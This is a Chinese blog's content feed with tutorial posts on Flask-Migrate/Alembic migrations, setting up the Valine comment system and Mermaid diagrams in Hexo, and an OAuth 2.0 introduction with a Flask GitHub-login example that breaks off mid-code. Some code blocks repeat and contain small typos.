MySQLImpl.INFO  [alembic.runtime.migration] Will assume non-transactional DDL.INFO  [alembic.autogenerate.compare] Detected added table 'user2'INFO  [alembic.autogenerate.compare] Detected added table 'address2'Generating circular_refrences/migrations/versions/b296ac4287bd_.py ...  done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看<code>mysql</code></p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:flask_migrate_demo> show tables;                                                 +------------------------------+| Tables_in_flask_migrate_demo |+------------------------------+| alembic_version              |+------------------------------+1 row in setTime: 0.013smysql root@192.168.101:flask_migrate_demo> select * from alembic_version;              +-------------+| version_num |+-------------+0 rows in setTime: 0.015s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="3-变更数据库版本"><a href="#3-变更数据库版本" class="headerlink" title="3.变更数据库版本"></a>3.变更数据库版本</h4><blockquote><p>现在记录下数据库的初始状态</p><pre class="line-numbers language-shell"><code class="language-shell">$ python manager.py db upgradeINFO  [alembic.runtime.migration] Context impl MySQLImpl.INFO  [alembic.runtime.migration] Will assume non-transactional DDL.INFO  [alembic.runtime.migration] Running upgrade  -> b296ac4287bd, empty messag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>查看数据库:</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql root@192.168.101:flask_migrate_demo> show tables;                                                          +------------------------------+| Tables_in_flask_migrate_demo |+------------------------------+| address2                     || alembic_version              || user2                        |+------------------------------+3 rows in setTime: 0.015smysql root@192.168.101:flask_migrate_demo> select * from alembic_version;            +--------------+| version_num  |+--------------+| b296ac4287bd |+--------------+1 row in setTime: 0.020s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到<code>mysql</code> 中确实创建了表.</p><p>当然可以对<code>Model</code> 添加字段做修改,然后从新创建新的迁移脚本,并升级或降级数据库版本.</p><p>需要注意的是:</p><p><code>Alembic</code> 对表名的更改,列名的更改,匿名约束等检测的不够准确,有时候是需要去<code>versions</code> 文件夹中找到相关的字段做修改的.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> SQLAlchemy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> Python </tag>
            
            <tag> MySQL </tag>
            
            <tag> alembic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客更新评论系统</title>
      <link href="/posts/9793.html"/>
      <url>/posts/9793.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hexo更换留言系统"><a href="#Hexo更换留言系统" class="headerlink" title="Hexo更换留言系统"></a><code>Hexo</code>更换留言系统</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><blockquote><p><code>Github</code>访问慢<br><code>Github</code>的注册账户才能留言<br>每次都会跳转页面<br>etc</p></blockquote><h3 id="Valine"><a href="#Valine" class="headerlink" title="Valine"></a><code>Valine</code></h3><blockquote><p>项目地址:<code>https://valine.js.org/</code><br><code>https://github.com/DesertsP/Valine-Admin</code></p></blockquote><h4 id="cleancloud"><a href="#cleancloud" class="headerlink" title="cleancloud"></a><code>cleancloud</code></h4><blockquote><ul><li>登录<code>cleancloud</code>国际版(注意一定是国际版),<a href="https://console.leancloud.app/" target="_blank" rel="noopener">注册</a>一个账户</li><li>进入控制台并创建一个应用,选择使用开发版<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij70iu9q8j20rl0f574j.jpg" alt="img"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij70iu3r7j20gx0cl3yt.jpg" alt="img"></li><li>应用创建完毕后,选择使用<code>git</code>部署,地址为:<code>https://github.com/DesertsP/Valine-Admin.git</code><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij7d6yuv0j20x50piqc9.jpg" alt="img"></li><li>点击设置,添加环境变量</li></ul><table><thead><tr><th align="left">变量</th><th align="left">示例</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>SITE_NAME</code></td><td align="left"><code>MyBlog</code></td><td align="left">[必填]博客名称</td></tr><tr><td align="left"><code>SITE_URL</code></td><td align="left"><a href="https://wenyan.online/" target="_blank" rel="noopener">https://wenyan.online</a></td><td align="left">[必填]博客首页</td></tr><tr><td align="left"><code>SMTP_SERVICE</code></td><td align="left">163</td><td align="left">支持<code>qq\163\126\Gmail\outlook</code> 等邮箱</td></tr><tr><td align="left"><code>SMTP_USER</code></td><td align="left"><a href="mailto:&#88;&#88;&#88;&#88;&#x58;&#x40;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#109;">&#88;&#88;&#88;&#88;&#x58;&#x40;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#109;</a></td><td align="left">[必填]SMTP登录用户</td></tr><tr><td align="left"><code>SMTP_PASS</code></td><td align="left">XXXXXXX</td><td align="left">[必填]SMTP登录密码（QQ邮箱需要获取独立密码）</td></tr><tr><td align="left"><code>SENDER_NAME</code></td><td align="left">WenYan</td><td align="left">[必填]发件人</td></tr><tr><td align="left"><code>SENDER_EMAIL</code></td><td align="left"><a href="mailto:&#x58;&#x58;&#88;&#88;&#88;&#x58;&#64;&#49;&#x36;&#51;&#x2e;&#99;&#x6f;&#x6d;">&#x58;&#x58;&#88;&#88;&#88;&#x58;&#64;&#49;&#x36;&#51;&#x2e;&#99;&#x6f;&#x6d;</a></td><td align="left">[必填]发件邮箱</td></tr><tr><td align="left"><code>ADMIN_URL</code></td><td align="left"><code>xx.xx.com</code></td><td align="left">[必填]]Web主机二级域名,用于自动唤醒</td></tr><tr><td align="left"><code>BLOGGER_EMAIL</code></td><td align="left"><a href="mailto:&#x78;&#120;&#120;&#x40;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;">&#x78;&#120;&#120;&#x40;&#x31;&#x36;&#x33;&#x2e;&#x63;&#x6f;&#109;</a></td><td align="left">[可选]博主通知收件地址，默认使用SENDER_EMAIL</td></tr><tr><td align="left"><code>AKISMET_KEY</code></td><td align="left">xxxx</td><td align="left">用于垃圾评论检测,为空是不使用反垃圾邮件</td></tr></tbody></table><ul><li>设置定时任务,点击定时任务,<ul><li>自动唤醒,定时访问<code>Web APP</code>二级域名防止云引擎休眠.选择<code>self-wake</code>云函数,Cron表达式为<code>0 */30 7-23 * * ?</code>,表示每天早7点到晚23点每隔30分钟访问云引擎,<code>ADMIN_URL</code>环境变量务必设置正确：</li><li>每天定时检查24小时内漏发的邮件通知;选择<code>resend-mails</code>云函数,Cron表达式为<code>0 0 8 * * ?</code>,表示每天早8点检查过去24小时内漏发的通知邮件并补发.<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij7w3gbqkj20tu07j3yw.jpg" alt="img"></li></ul></li><li>二级域名用于评论后台管理(需要有自己的域名,如果没有,则需要使用系统给予的二级域名)<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij7zw7vkgj20wz0fvmy1.jpg" alt="img"></li><li>评论管理,访问设置的二级域名<code>https://二级域名/sign-up</code>,注册管理员登录信息(如果不显示直接跳转至登录页,需要手动删除存储<code>_User</code>表中内容)</li></ul><hr><ul><li>垃圾评论检测:访问<code>https://akismet.com/development/</code> 注册账户.最后会生成一个<code>key</code>,要保存好.<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij8999topj20q60bbt8x.jpg" alt="img"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij8999qzgj20y90hqgmh.jpg" alt="img"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij899aaqlj212r0k43zy.jpg" alt="img"></li><li>把自己的网站加入安全中心,如下:<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij8d2uwdjj212e0kjq4f.jpg" alt="img"></li><li>获取应用<code>key</code>:<br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gij8eo2ct2j211v0cuwfo.jpg" alt="img"></li></ul></blockquote><h4 id="应用key"><a href="#应用key" class="headerlink" title="应用key"></a>应用<code>key</code></h4><blockquote><p>如果你用的是<code>hexo-theme-matery</code> 主题,他已经集成了评论创建,只需要开启即可.</p></blockquote><h4 id="头像问题"><a href="#头像问题" class="headerlink" title="头像问题"></a>头像问题</h4><blockquote><p>评论留言想要拥有自己的头像.<br>请自行登录或注册<a href="http://cn.gravatar.com/" target="_blank" rel="noopener">Gravatar</a>，然后修改自己的头像。评论的时候，留下在Gravatar注册时所使用的邮箱即可。</p></blockquote><h2 id="Hexo支持流程图"><a href="#Hexo支持流程图" class="headerlink" title="Hexo支持流程图"></a><code>Hexo</code>支持流程图</h2><blockquote><p>在Markdown中支援使用Mermaid语法来创建流程图，但要能在Hexo部落格呈现图表，仍然需要进行一些设定。这边我使用了<code>hexo-filter-mermaid-diagrams</code>的套件。</p><p><code>https://github.com/webappdevelp/hexo-filter-mermaid-diagrams</code></p></blockquote><h3 id="1-安装hexo插件"><a href="#1-安装hexo插件" class="headerlink" title="1.安装hexo插件"></a>1.安装<code>hexo</code>插件</h3><blockquote><pre class="line-numbers language-bash">npm install hexo-filter-mermaid-diagrams</code></pre></blockquote><h3 id="2-修改主题"><a href="#2-修改主题" class="headerlink" title="2.修改主题"></a>2.修改主题</h3><blockquote><p>修改<code>themes/hexo-theme-matery/layout/_partial/footer.ejs</code></p><pre><code class="ejs"><code class="language-bash">npm install hexo-filter-mermaid-diagrams</code></pre></blockquote><h3 id="2-修改主题"><a href="#2-修改主题" class="headerlink" title="2.修改主题"></a>2.修改主题</h3><blockquote><p>修改<code>themes/hexo-theme-matery/layout/_partial/footer.ejs</code></p><pre><code class="ejs"><% if (theme.mermaid.enable) { %>  <script src='https://unpkg.com/mermaid@<%= theme.mermaid.version %>/dist/mermaid.min.js'></script>  <script>    if (window.mermaid) {      mermaid.initialize({theme: 'forest'});    }  </script><% } %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改根目录下的<code>_config.yml</code></p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># mermaid chart</span><span class="token key atrule">mermaid</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">## mermaid url https://github.com/knsv/mermaid</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true  </span><span class="token comment" spellcheck="true"># default true</span>  <span class="token key atrule">version</span><span class="token punctuation">:</span> <span class="token string">"7.1.2"</span> <span class="token comment" spellcheck="true"># default v7.1.2</span>  <span class="token key atrule">options</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># find more api options from https://github.com/knsv/mermaid/blob/master/src/mermaidAPI.js</span>    <span class="token comment" spellcheck="true">#startOnload: true  // default true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-部署上传"><a href="#3-部署上传" class="headerlink" title="3.部署上传"></a>3.部署上传</h3><blockquote><pre class="line-numbers language-bash"><code class="language-bash">$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> valine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OAuth2.0协议介绍</title>
      <link href="/posts/60534.html"/>
      <url>/posts/60534.html</url>
      
        <content type="html"><![CDATA[<h2 id="OAuth2-0-协议"><a href="#OAuth2-0-协议" class="headerlink" title="OAuth2.0 协议"></a><code>OAuth2.0</code> 协议</h2><h3 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h3><blockquote><p><a href="https://wenyan.online/" target="_blank" rel="noopener">个人博客</a><code>https://wenyan.online</code> 有一个评论的功能,如果用户想要评论文章,必须申请用户名和密码登录.但是,它也可以很方便的使用<code>Github</code>账户进行第三方登录,非常的高效.</p><p>像这样的,便捷安全的登录第三方应用的协议就是<code>OAuth</code>.</p><p><a href="https://github.com/ningwenyan/demo_code" target="_blank" rel="noopener">参考代码</a>:<code>https://github.com/ningwenyan/demo_code</code></p></blockquote><h3 id="什么是OAuth-2-0"><a href="#什么是OAuth-2-0" class="headerlink" title="什么是OAuth 2.0"></a>什么是<code>OAuth 2.0</code></h3><blockquote><p><code>OAuth</code>:开放授权是一个开放标准,允许用户让第三方应用访问该用户在某一网站上存储的私密的资源(如照片,视频,联系人列表),而无需将用户名和密码提供给第三方应用.</p><p><code>OAuth</code>允许用户提供一个<code>token</code>,而不是用户名和密码来访问他们存放在特定服务器上的数据.每一个令牌授权一个特定的网站在特定的时段内访问特定的资源.这样,<code>OAuth</code>让用户可以授权第三方网站访问他们存储在另外服务提供者的某些特定信息,而非所有内容.</p><p><code>OAuth2.0</code>是<code>OAuth</code>协议的下一个版本,当不向上兼容.<code>OAuth2.0</code>注客户端开发者的简易性,同时为为<code>Web</code>应用,桌面应用,手机和智能设备提供专门的认证流程.</p></blockquote><h3 id="角色-roles"><a href="#角色-roles" class="headerlink" title="角色(roles)"></a>角色(<code>roles</code>)</h3><blockquote><p>整个协议中所有涉及到的角色</p><ul><li><code>resource owner</code>:资源拥有者,能够运行访问收保护资源的实体.</li><li><code>resource serve</code>:资源服务器,托管受保护资源的服务器</li><li><code>client</code>:客户端,第三方应用.如:<code>web</code>站点,移动应用等.</li><li><code>authorization server</code>:授权服务器,即服务提供商专门用来处理认证的服务器</li><li><code>user agent</code>:用户代理,一般为<code>web</code>浏览器,移动<code>app</code>等</li></ul></blockquote><h3 id="协议流程"><a href="#协议流程" class="headerlink" title="协议流程"></a>协议流程</h3><blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-4/1599231300483-10272.png" alt="10272">’</p><ul><li><p><code>A</code> : 客户端向资源拥有者请求授权.授权请求可以直接对资源所有者请求,也可以通过<code>Authorization server</code> 中转间接进行.</p></li><li><p><code>B</code>: 资源所有者运行授权,并返回凭证</p></li><li><p><code>C</code>:客户端通过授权服务器进行身份验证,并提供授权凭证,同时,请求<code>token</code>令牌</p></li><li><p><code>D</code>:授权服务器对客户顿进行身份验证,如果有效,,则发布<code>token</code>令牌.</p></li><li><p><code>E</code>:客户端通过提供<code>token</code>进行身份验证,进而请求资源服务器受保护的资源</p></li><li><p><code>F</code>: 资源服务器验证访问令牌,如果正确这返回受保护资源</p></li><li><p>实例: 我 使用 <code>github</code>账户登录<code>wenyan.online</code>.那么我就是<code>resource owner</code> ,<code>wenyan.online</code>这个网站就是<code>client</code>客户端,浏览器就是<code>user agent</code>,资源服务器和授权服务器都是<code>github</code>.</p></li></ul></blockquote><h3 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h3><blockquote><p>根据流程可以看到,要获得<code>access token</code> 必须先得到授权服务器授权(<code>authorization grant</code>).为了得到这个授权,<code>OAuth 2.0</code> 定义了<code>4</code>种类型的授权类型</p><ul><li><code>authorizaiton code</code>:授权码模式,服务器与客户端配合使用.(重点)</li><li><code>implicit</code>:隐式<code>token</code>,主要用于移动应用程序或<code>web</code>应用程序</li><li><code>resource owner password credentials</code> :密码模式,资源所有者和客户端之间具有高度信任时,比如,客户端是操作系统的一部分才使用.</li><li><code>client credentials</code>:客户端模式,用户直接向客户端注册,严格来说,客户端模式不属于<code>OAuth</code>解决的问题.</li></ul></blockquote><h4 id="授权码模式"><a href="#授权码模式" class="headerlink" title="授权码模式"></a>授权码模式</h4><blockquote><p>授权码模式是功能最网站,使用最广泛,流程最严密的授权模式.</p><p>由于这是一个基于重定向的流,所以<code>client</code>客户端必须能够与资源所有者的<code>user agent</code>(浏览器)进行交互,并且能够从授权服务器接收传入的重定向<code>redirect</code>请求.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599283289954-10273.png" alt="10273"></p><ul><li><code>A</code>:用户访问<code>client</code>客户端,客户端采用第三方登录,并且将用户导向第三方授权服务器,通过用户代理<code>User agent</code>发送包括<code>client</code>的<code>client identifier, requested scope, local state, and a redirection URI</code>一并发送给授权服务器.</li><li><code>B</code>:授权服务器对资源所有者进行身份验证,并确定资源所有者是否授予或拒绝客户端的访问请求</li><li><code>C</code>:如果资源所有者同意授权请求,那么授权服务器将会使用指定的重定向<code>redirection URL</code>.跳转到客户端,并附加一个授权码<code>code</code>和一个本地状态码<code>state</code>,(如果<code>A</code>步骤提供,则会原值返回)</li><li><code>D</code>:客户端收到授权码,附加上<code>redirection URL</code>,向授权服务器申请令牌<code>token</code>. 这一步是在客户端的后台服务器完成的,用户不可见.发出请求后,授权服务器对客户端进行身份验证,请求参数中包含<code>code, client_id,client_secret, redirection URI</code></li><li><code>E</code>:授权服务器对客户端进行身份验证,验证授权代码<code>code</code>,并确保收到的<code>redirection URL</code>与步骤<code>C</code>中的<code>URL</code>匹配.如果有效,授权服务器将发送<code>access token</code>和<code>refresh token</code></li><li><code>client</code>拿到令牌<code>token</code>就可以向第三方的资源服务器请求资源.</li></ul></blockquote><h4 id="OAuth-2-0登录示例"><a href="#OAuth-2-0登录示例" class="headerlink" title="OAuth 2.0登录示例"></a><code>OAuth 2.0</code>登录示例</h4><blockquote><p>以<code>github</code>为例,写一个简单的应用,演示第三方登录.</p></blockquote><h5 id="1-授权码模式登录"><a href="#1-授权码模式登录" class="headerlink" title="1.授权码模式登录"></a>1.授权码模式登录</h5><blockquote><p>自建网站<code>web</code>,<code>web</code>网站让用户提供第三方网站的数据,证明自己的身份.获取第三方网站的数据,使用的是<code>OAuth</code>协议,按照协议,它将满足:</p><ul><li><code>A</code>:资源所有者<code>user</code>,使用<code>client</code>网站<code>web</code>在浏览器(<code>user agent</code>)中登录,客户端将<code>user</code>跳转到<code>github</code>.</li><li><code>B</code>:<code>github</code>要求用户登录,询问<code>web</code>将要获取<code>xx</code>权限,你是否同意?</li><li><code>C</code>:<code>user</code>同意后,<code>github</code>(授权服务器)将会重定向到<code>web</code>站点,同时发回一个授权码<code>code</code></li><li><code>D</code>:<code>web</code>站点(即客户端)使用授权码,向<code>github</code>请求令牌<code>token</code>.</li><li><code>E</code>:<code>Github</code>返回令牌.</li><li><code>web</code>站点使用令牌,向<code>github</code>(资源服务器)请求用户数据.</li></ul><hr><p>此部分实现,参照<code>github</code>官方文档:<code>https://docs.github.com/cn/developers/apps/authorizing-oauth-apps</code></p></blockquote><h5 id="2-OAuth-APP"><a href="#2-OAuth-APP" class="headerlink" title="2.OAuth APP"></a>2.<code>OAuth APP</code></h5><blockquote><p>首先,<code>Github</code>作为一个授权服务器,我们必须先在其服务器上登记并创建一个<code>oauth app</code>程序.</p><p>登录<code>github</code>,点击<code>setting--Developer settings-oauth apps--new oauth app</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599286800968-10274.gif" alt="10274"></p><p>主要参数:</p><ul><li><code>application name</code>:应用名称</li><li><code>homepage url</code>:网站根目录,可以指定<code>127.0.0.1:5000</code>或者其他<code>ip</code>地址.</li><li><code>application description</code>:描述信息</li><li><code>authorization callback url</code>:这个选项比较重要,指定登录成功的回调地址.</li></ul><p>提交后,<code>Github</code>会返回客户端<code>ID</code>(<code>client id</code>)和客户端秘钥(<code>client secret</code>).</p></blockquote><h5 id="3-授权oauth应用程序"><a href="#3-授权oauth应用程序" class="headerlink" title="3.授权oauth应用程序"></a>3.授权<code>oauth</code>应用程序</h5><blockquote><p>这里根据<code>github</code>的<a href="https://docs.github.com/cn/developers/apps/authorizing-oauth-apps" target="_blank" rel="noopener">说明文档</a>使用<code>Flask</code>创建一个基本<code>web</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_templateapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'DEBUG'</span><span class="token punctuation">:</span><span class="token boolean">True</span><span class="token punctuation">,</span><span class="token string">'TEMPLATES_AUTO_RELOAD'</span> <span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">}</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们给后台的<code>index.html</code>写一个跳转的<code>url</code>,用于请求用户的<code>github</code>身份.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/redirect_github/'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">redirect_github</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>url <span class="token operator">=</span> <span class="token string">'https://github.com/login/oauth/authorize'</span> <span class="token comment" spellcheck="true"># 这是官网给定的地址,且必须使用 get 方法</span>params <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'client_id'</span><span class="token punctuation">:</span> client_id<span class="token punctuation">,</span> <span class="token comment" spellcheck="true"># 必填</span>  <span class="token string">'scope'</span> <span class="token punctuation">:</span> <span class="token string">'read:user user:email'</span><span class="token punctuation">}</span>url <span class="token operator">=</span> furl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>set<span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!--index.html --></span><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>{{ url_for(<span class="token punctuation">'</span>redirect_github<span class="token punctuation">'</span>) }}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Github<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>现在一个一个的解释一下,根据官方文档<code>https://docs.github.com/cn/developers/apps/authorizing-oauth-apps</code>:</p><p>请求跳转<code>github</code>的地址为<code>GET https://github.com/login/oauth/authorize</code>,在其中可以指定多个参数.(这里只说明2个)</p><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>client_id</code></td><td><code>string</code></td><td>必填,是<code>oauth app</code>生成的<code>client_id</code></td></tr><tr><td><code>scope</code></td><td><code>string</code></td><td>以空格分割的作用域列表,用于指定客户端获取的权限</td></tr></tbody></table><p>注:具体的权限,请查看<a href="https://docs.github.com/en/developers/apps/scopes-for-oauth-apps#available-scopes" target="_blank" rel="noopener">官方文档</a></p><hr><p>按照<code>oauth</code>协议</p><ul><li>用户:资源拥有者</li><li><code>127.0.0.1:8080</code>:客户端<code>client</code></li><li><code>github</code>:授权服务器</li><li>浏览器:<code>user agent</code></li></ul><hr><ol><li>访问<code>127.0.0.1:8080</code>,并使用<code>github</code>第三方登录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599290439313-10274.png" alt="10274"></p><ol start="2"><li>点击登录跳转到<code>github</code>,<code>github</code>要求登录,并询问授予的权限,这个权限的控制来自于<code>scope</code>字段.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599290439208-10275.png" alt="10275"></p><ol start="3"><li>点击授权后,<code>github</code>重定向到之前设置的<code>callback</code>页面,并返回一个<code>code</code>授权码.到此为止,用户和<code>github</code>的协商就完成了,剩下的就是<code>client</code>和<code>github</code>之间的协商.</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-5/1599290977057-10276.png" alt="10276"></p><ol start="4"><li>按照协议,<code>client</code>要使用<code>code</code>授权码去申请<code>token</code>.根据<code>github</code>官方说明申请如下:</li></ol><pre class="line-numbers language-html">POST https://github.com/login/oauth/access_token</code></pre><p>可以衔接如下参数:</p><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>client_id</code></td><td><code>string</code></td><td><code>oauth app client_id</code>必填</td></tr><tr><td><code>client_secret</code></td><td><code>string</code></td><td><code>oauth app client_secret</code>必填</td></tr><tr><td><code>code</code></td><td><code>string</code></td><td>上一步收到的<code>code</code>必填</td></tr></tbody></table><pre><code class="python"><code class="language-html">POST https://github.com/login/oauth/access_token</code></pre><p>可以衔接如下参数:</p><table><thead><tr><th>名称</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>client_id</code></td><td><code>string</code></td><td><code>oauth app client_id</code>必填</td></tr><tr><td><code>client_secret</code></td><td><code>string</code></td><td><code>oauth app client_secret</code>必填</td></tr><tr><td><code>code</code></td><td><code>string</code></td><td>上一步收到的<code>code</code>必填</td></tr></tbody></table><pre><code class="python"># app.py# 定义回环路由@app.rout('/oauth2/callback')def oauth2_callback():    # 获取code    code = request.args.get('code')    # 根据code 获取 token    access_token_url = 'https://github.com/login/oauth/access_token'    # 可用参数    payload = {        'client_id':client_id,        'client_secret':client_secret,        'code':code    }    # 发送 post    r = requests.post(access_token_url, json=payload, headers={'Accept':'application/json'})    print(json.loads(r.text))    # 获取token    access_toke = json.loads(r.text).get('access_token')<span aria-hidden="true" 